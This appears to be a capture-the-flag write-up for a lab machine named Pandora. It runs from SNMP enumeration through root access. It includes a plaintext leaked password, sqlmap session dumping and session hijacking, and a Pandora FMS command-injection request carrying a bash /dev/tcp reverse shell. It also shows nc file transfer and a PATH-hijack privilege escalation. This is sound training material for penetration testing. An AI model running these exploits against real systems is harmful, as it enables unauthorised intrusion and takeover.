@@ -1,0 +1,482 @@
+Machine-Name : Pandora
+IP Address   : 10.129.82.234
+
+Command-Line: sudo nmap 10.129.82.234 -p- -A -T4 -o nmap/tcp.txt
+Result:
+    ./nmap/tcp.txt
+
+Command-Line: sudo nmap 10.129.82.234 -sU --min-rate=1000 -T4 -o nmap/udp.txt
+Result:
+    ./nmap/udp.txt
+
+Notes: Found website. Nothing interesting or notable. The nmap scan found SNMP operating on UDP port 161.
+
+Command-Line: mkdir snmp-enumeration && cd snmp-enumeration
+Command-Line(./snmp-enumeration): snmpwalk -v 1 -c public panda.htb > snmp.dump
+Result:
+    ./snmp-enumeration/snmp.dump
+
+Command-Line: head snmp.dump
+Result:
+    iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"
+    iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+    iso.3.6.1.2.1.1.3.0 = Timeticks: (3725620) 10:20:56.20
+    iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
+    iso.3.6.1.2.1.1.5.0 = STRING: "pandora"
+    iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"
+    iso.3.6.1.2.1.1.7.0 = INTEGER: 72
+    iso.3.6.1.2.1.1.8.0 = Timeticks: (36) 0:00:00.36
+    iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
+    iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
+
+Notes: Found strings "Daniel", "pandora", and "Mississippi".
+
+Command-Line: cat snmp.dump | grep -i daniel
+Result:
+    iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
+    iso.3.6.1.2.1.25.4.2.1.5.975 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
+    iso.3.6.1.2.1.25.4.2.1.5.1124 = STRING: "-u daniel -p HotelBabylon23"
+
+Notes: Found credentials user:daniel password:HotelBabylon23 - Attempting SSH connection.
+
+Command-Line: ssh daniel@panda.htb
+Result:
+    **SUCCESSFUL**
+    daniel@pandora:~$
+
+daniel@pandora:/etc/apache2/sites-enabled$ cat pandora.conf
+Result:
+    <VirtualHost localhost:80>
+      ServerAdmin admin@panda.htb
+      ServerName pandora.panda.htb
+      DocumentRoot /var/www/pandora
+      AssignUserID matt matt
+      <Directory /var/www/pandora>
+        AllowOverride All
+      </Directory>
+      ErrorLog /var/log/apache2/error.log
+      CustomLog /var/log/apache2/access.log combined
+    </VirtualHost>
+
+Notes: Found pandora running on localhost:80 on user "daniel". Adding pandora.panda.htb to /etc/hosts
+
+Notes: SSH tunneling into the VirtualHost.
+
+daniel@pandora:/etc/apache2/sites-enabled$ ssh ~C
+Result:
+    ssh: Could not resolve hostname ~c: Name or service not known
+
+daniel@pandora:/etc/apache2/sites-enabled$ ~C
+Result:
+    ssh>
+
+ssh> -L 9001:127.0.0.1:80
+Result:
+    Forwarding port.
+
+Browser: 127.0.0.1:9001
+Result:
+    http://localhost:9001/pandora_console/
+    **NEW PAGE FOUND**
+
+Notes: Version number found at footer of website.
+Version: v7.0NG.742_FIX_PERL2020
+
+Browser: v7.0NG.742_FIX_PERL2020 exploit
+Result:
+    https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained/
+
+Notes: SQL injection prone through the specified path and unique session_id.
+
+Command-Line: mkdir sqlmap && cd sqlmap
+Command-Line(./sqlmap): nano pandora.panda.htb.req
+Result:
+    ./sqlmap/pandora.panda.htb.req
+
+Command-Line(./sqlmap): sqlmap -r pandora.panda.htb.req --dbs
+Result:
+    available databases [2]:
+    [*] information_schema
+    [*] pandora
+
+Command-Line(./sqlmap): sqlmap -r pandora.panda.htb.req -D pandora --tables
+Result:
+    Database: pandora
+    [178 tables]
+    +------------------------------------+
+    | taddress                           |
+    | taddress_agent                     |
+    | tagent_access                      |
+    | tagent_custom_data                 |
+    | tagent_custom_fields               |
+    | tagent_custom_fields_filter        |
+    | tagent_module_inventory            |
+    | tagent_module_log                  |
+    | tagent_repository                  |
+    | tagent_secondary_group             |
+    | tagente                            |
+    | tagente_datos                      |
+    | tagente_datos_inc                  |
+    | tagente_datos_inventory            |
+    | tagente_datos_log4x                |
+    | tagente_datos_string               |
+    | tagente_estado                     |
+    | tagente_modulo                     |
+    | talert_actions                     |
+    | talert_commands                    |
+    | talert_snmp                        |
+    | talert_snmp_action                 |
+    | talert_special_days                |
+    | talert_template_module_actions     |
+    | talert_template_modules            |
+    | talert_templates                   |
+    | tattachment                        |
+    | tautoconfig                        |
+    | tautoconfig_actions                |
+    | tautoconfig_rules                  |
+    | tcategory                          |
+    | tcluster                           |
+    | tcluster_agent                     |
+    | tcluster_item                      |
+    | tcollection                        |
+    | tconfig                            |
+    | tconfig_os                         |
+    | tcontainer                         |
+    | tcontainer_item                    |
+    | tcredential_store                  |
+    | tdashboard                         |
+    | tdatabase                          |
+    | tdeployment_hosts                  |
+    | tevent_alert                       |
+    | tevent_alert_action                |
+    | tevent_custom_field                |
+    | tevent_extended                    |
+    | tevent_filter                      |
+    | tevent_response                    |
+    | tevent_rule                        |
+    | tevento                            |
+    | textension_translate_string        |
+    | tfiles_repo                        |
+    | tfiles_repo_group                  |
+    | tgis_data_history                  |
+    | tgis_data_status                   |
+    | tgis_map                           |
+    | tgis_map_connection                |
+    | tgis_map_has_tgis_map_con          |
+    | tgis_map_layer                     |
+    | tgis_map_layer_groups              |
+    | tgis_map_layer_has_tagente         |
+    | tgraph                             |
+    | tgraph_source                      |
+    | tgraph_source_template             |
+    | tgraph_template                    |
+    | tgroup_stat                        |
+    | tgrupo                             |
+    | tincidencia                        |
+    | titem                              |
+    | tlanguage                          |
+    | tlayout                            |
+    | tlayout_data                       |
+    | tlayout_template                   |
+    | tlayout_template_data              |
+    | tlink                              |
+    | tlocal_component                   |
+    | tlog_graph_models                  |
+    | tmap                               |
+    | tmensajes                          |
+    | tmetaconsole_agent                 |
+    | tmetaconsole_agent_secondary_group |
+    | tmetaconsole_event                 |
+    | tmetaconsole_event_history         |
+    | tmetaconsole_setup                 |
+    | tmigration_module_queue            |
+    | tmigration_queue                   |
+    | tmodule                            |
+    | tmodule_group                      |
+    | tmodule_inventory                  |
+    | tmodule_relationship               |
+    | tmodule_synth                      |
+    | tnetflow_filter                    |
+    | tnetflow_report                    |
+    | tnetflow_report_content            |
+    | tnetwork_component                 |
+    | tnetwork_component_group           |
+    | tnetwork_map                       |
+    | tnetwork_matrix                    |
+    | tnetwork_profile                   |
+    | tnetwork_profile_component         |
+    | tnetworkmap_ent_rel_nodes          |
+    | tnetworkmap_enterprise             |
+    | tnetworkmap_enterprise_nodes       |
+    | tnews                              |
+    | tnota                              |
+    | tnotification_group                |
+    | tnotification_source               |
+    | tnotification_source_group         |
+    | tnotification_source_group_user    |
+    | tnotification_source_user          |
+    | tnotification_user                 |
+    | torigen                            |
+    | tpassword_history                  |
+    | tperfil                            |
+    | tphase                             |
+    | tplanned_downtime                  |
+    | tplanned_downtime_agents           |
+    | tplanned_downtime_modules          |
+    | tplugin                            |
+    | tpolicies                          |
+    | tpolicy_agents                     |
+    | tpolicy_alerts                     |
+    | tpolicy_alerts_actions             |
+    | tpolicy_collections                |
+    | tpolicy_groups                     |
+    | tpolicy_modules                    |
+    | tpolicy_modules_inventory          |
+    | tpolicy_plugins                    |
+    | tpolicy_queue                      |
+    | tprofile_view                      |
+    | tprovisioning                      |
+    | tprovisioning_rules                |
+    | trecon_script                      |
+    | trecon_task                        |
+    | trel_item                          |
+    | tremote_command                    |
+    | tremote_command_target             |
+    | treport                            |
+    | treport_content                    |
+    | treport_content_item               |
+    | treport_content_item_temp          |
+    | treport_content_sla_com_temp       |
+    | treport_content_sla_combined       |
+    | treport_content_template           |
+    | treport_custom_sql                 |
+    | treport_template                   |
+    | treset_pass                        |
+    | treset_pass_history                |
+    | tserver                            |
+    | tserver_export                     |
+    | tserver_export_data                |
+    | tservice                           |
+    | tservice_element                   |
+    | tsesion                            |
+    | tsesion_extended                   |
+    | tsessions_php                      |
+    | tskin                              |
+    | tsnmp_filter                       |
+    | ttag                               |
+    | ttag_module                        |
+    | ttag_policy_module                 |
+    | ttipo_modulo                       |
+    | ttransaction                       |
+    | ttrap                              |
+    | ttrap_custom_values                |
+    | tupdate                            |
+    | tupdate_journal                    |
+    | tupdate_package                    |
+    | tupdate_settings                   |
+    | tuser_double_auth                  |
+    | tuser_task                         |
+    | tuser_task_scheduled               |
+    | tusuario                           |
+    | tusuario_perfil                    |
+    | tvisual_console_elements_cache     |
+    | twidget                            |
+    | twidget_dashboard                  |
+    +------------------------------------+
+
+Command-Line(./sqlmap): sqlmap -r pandora.panda.htb.req -D pandora -T tsessions_php --dump
+Result:
+    +----------------------------+-----------------------------------------------------+-------------+
+    | id_session                 | data                                                | last_active |
+    +----------------------------+-----------------------------------------------------+-------------+
+    | 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";                            | 1638783555  |
+    | 0ahul7feb1l9db7ffp8d25sjba | NULL                                                | 1638789018  |
+    | 1um23if7s531kqf5da14kf5lvm | NULL                                                | 1638792211  |
+    | 2e25c62vc3odbppmg6pjbf9bum | NULL                                                | 1638786129  |
+    | 346uqacafar8pipuppubqet7ut | id_usuario|s:6:"daniel";                            | 1638540332  |
+    | 3me2jjab4atfa5f8106iklh4fc | NULL                                                | 1638795380  |
+    | 4f51mju7kcuonuqor3876n8o02 | NULL                                                | 1638786842  |
+    | 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:"daniel";                            | 1638535373  |
+    | 59qae699l0971h13qmbpqahlls | NULL                                                | 1638787305  |
+    | 5fihkihbip2jioll1a8mcsmp6j | NULL                                                | 1638792685  |
+    | 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:"daniel";                            | 1638281946  |
+    | 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:"daniel";                            | 1641195617  |
+    | 81f3uet7p3esgiq02d4cjj48rc | NULL                                                | 1623957150  |
+    | 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:"daniel";                            | 1638446321  |
+    | 8upeameujo9nhki3ps0fu32cgd | NULL                                                | 1638787267  |
+    | 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:"daniel";                            | 1638881787  |
+    | a3a49kc938u7od6e6mlip1ej80 | NULL                                                | 1638795315  |
+    | agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:"daniel";                            | 1638881664  |
+    | bbhf4mtod74tqhv50mpdvu4lj5 | id_usuario|s:6:"daniel";                            | 1641201982  |
+    | cojb6rgubs18ipb35b3f6hf0vp | NULL                                                | 1638787213  |
+    | d0carbrks2lvmb90ergj7jv6po | NULL                                                | 1638786277  |
+    | f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:"daniel";                            | 1641200284  |
+    | fikt9p6i78no7aofn74rr71m85 | NULL                                                | 1638786504  |
+    | fqd96rcv4ecuqs409n5qsleufi | NULL                                                | 1638786762  |
+    | g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";                            | 1638783230  |
+    | g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0; | 1638796349  |
+    | gf40pukfdinc63nm5lkroidde6 | NULL                                                | 1638786349  |
+    | heasjj8c48ikjlvsf1uhonfesv | NULL                                                | 1638540345  |
+    | hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:"daniel";                            | 1638168492  |
+    | jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:"daniel";                            | 1638456173  |
+    | kp90bu1mlclbaenaljem590ik3 | NULL                                                | 1638787808  |
+    | mb7pdsp6uplcmmr188k9j4buuo | id_usuario|s:6:"daniel";                            | 1660040242  |
+    | ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                | 1638796348  |
+    | o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:"daniel";                            | 1638540482  |
+    | oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:"daniel";                            | 1637667827  |
+    | pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:"daniel";                            | 1638168416  |
+    | qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                | 1638787723  |
+    | r097jr6k9s7k166vkvaj17na1u | NULL                                                | 1638787677  |
+    | rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:"daniel";                            | 1638889082  |
+    | u59i8r2sms5nbppdlgb547c8vp | NULL                                                | 1660038908  |
+    | u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:"daniel";                            | 1638547193  |
+    | u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:"daniel";                            | 1638793297  |
+    | vib39hf0alqe6sh5o0bvv0g0ra | id_usuario|s:6:"daniel";                            | 1659995891  |
+    +----------------------------+-----------------------------------------------------+-------------+
+
+Notes: Notice "matt" only has 1 session_id:
+Result:
+    g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0; | 1638796349
+
+Browser: localhost:9001/pandora_console/include/chart_generator.php?session_id=g4e01qdgk36mfdh90hvcc54umq
+Notes: Logged into localhost:9001/pandora_console successfully as "matt".
+
+Browser: Pandora FMS RCE
+Result:
+    https://www.coresecurity.com/core-labs/advisories/pandora-fms-community-multiple-vulnerabilities
+
+Notes: Added 127.0.0.1:9009 username:daniel password:HotelBabylon23 to FoxyProxy. Added 127.0.0.1:9009 in BurpSuite.
+Notes: From the dashboard, clicked "Events" and captured the request in BurpSuite.
+Request:
+    POST /pandora_console/ajax.php HTTP/1.1
+    Host: 127.0.0.1:9001
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+    Accept: application/json, text/javascript, */*; q=0.01
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    X-Requested-With: XMLHttpRequest
+    Content-Length: 84
+    Origin: http://127.0.0.1:9001
+    DNT: 1
+    Connection: close
+    Referer: http://127.0.0.1:9001/pandora_console/index.php?sec=eventos&sec2=operation/events/events
+    Cookie: PHPSESSID=97br2iaa1v0biicmn90rresgme
+    Sec-Fetch-Dest: empty
+    Sec-Fetch-Mode: cors
+    Sec-Fetch-Site: same-origin
+
+    page=include/ajax/events&perform_event_response=10000000&target=whoami&response_id=1
+
+Result:
+    Output => Matt
+    **RCE SUCCESSFUL**
+
+Notes: Once in Repeater, changed request parameters and values to execute a reverse shell.
+Command-Line: nc -lvnp 9002
+Request:
+    POST /pandora_console/ajax.php HTTP/1.1
+    Host: 127.0.0.1:9001
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+    Accept: application/json, text/javascript, */*; q=0.01
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    X-Requested-With: XMLHttpRequest
+    Content-Length: 133
+    Origin: http://127.0.0.1:9001
+    DNT: 1
+    Connection: close
+    Referer: http://127.0.0.1:9001/pandora_console/index.php?sec=eventos&sec2=operation/events/events
+    Cookie: PHPSESSID=97br2iaa1v0biicmn90rresgme
+    Sec-Fetch-Dest: empty
+    Sec-Fetch-Mode: cors
+    Sec-Fetch-Site: same-origin
+
+    page=include/ajax/events&perform_event_response=10000000&target=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.39/9002+0>%261'&response_id=1
+
+Result:
+    matt@pandora:/var/www/pandora/pandora_console$
+    **REVERSE SHELL**
+
+matt@pandora:/var/www/pandora/pandora_console$ cat /home/matt/user.txt
+Result:
+    54c97ba17d4fd99124afbd78aa8fa57b
+    **USER OWNED**
+
+Command-Line: find / -perm -4000 2>/dev/null
+Result:
+    /usr/bin/sudo
+    /usr/bin/pkexec
+    /usr/bin/chfn
+    /usr/bin/newgrp
+    /usr/bin/gpasswd
+    /usr/bin/umount
+    /usr/bin/pandora_backup
+    /usr/bin/passwd
+    /usr/bin/mount
+    /usr/bin/su
+    /usr/bin/at
+    /usr/bin/fusermount
+    /usr/bin/chsh
+    /usr/lib/openssh/ssh-keysign
+    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    /usr/lib/eject/dmcrypt-get-device
+    /usr/lib/policykit-1/polkit-agent-helper-1
+
+matt@pandora:~$ /usr/bin/pandora_backup
+Result:
+    /usr/bin/pandora_backup
+    tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
+    tar: Error is not recoverable: exiting now
+    PandoraFMS Backup Utility
+    Now attempting to backup PandoraFMS client
+    Backup failed!
+    Check your permissions!
+
+Browser: GTFOBins / at
+Notes: Breaking out of a restrictive shell.
+Result:
+    https://gtfobins.github.io/gtfobins/at/
+
+matt@pandora:~$ echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
+Result:
+    $
+    **BREAKOUT SUCCESSFUL**
+
+$ script -q /dev/null -c bash
+Result:
+    matt@pandora:~$
+
+matt@pandora:/dev/shm$ file /usr/bin/pandora_backup
+Result:
+    /usr/bin/pandora_backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7174c3b04737ad11254839c20c8dab66fce55af8, for GNU/Linux 3.2.0, not stripped
+Notes: Sending pandora_backup to localhost for evaluation using Ghidra.
+matt@pandora:~$ nc 10.10.14.39 9999 < /usr/bin/pandora_backup
+Command-Line: mkdir www;cd www
+Command-Line(./www): nc -lvnp 9999 > pandora_backup
+
+Notes: Opened file using Ghidra. Found the "tar" command is being called without a direct path. Attempting to hijack path.
+Image:
+    ./images/pandora_backup_ghidra.png
+
+matt@pandora:~$ export PATH=/dev/shm:$PATH
+matt@pandora:~$ cd /dev/shm
+matt@pandora:/dev/shm$ nano tar
+Contents:
+    #!/bin/bash
+
+    bash
+
+matt@pandora:/dev/shm$ chmod +x tar
+matt@pandora:/dev/shm$ /usr/bin/pandora_backup
+Result:
+    root@pandora:/dev/shm#
+    **ROOT ACCESS**
+
+root@pandora:/dev/shm# cat /root/root.txt
+Result:
+    fc15c793a1ca1087b8410fe7d4239025
+    **ROOT OWNED**
+
+      **FINISHED**
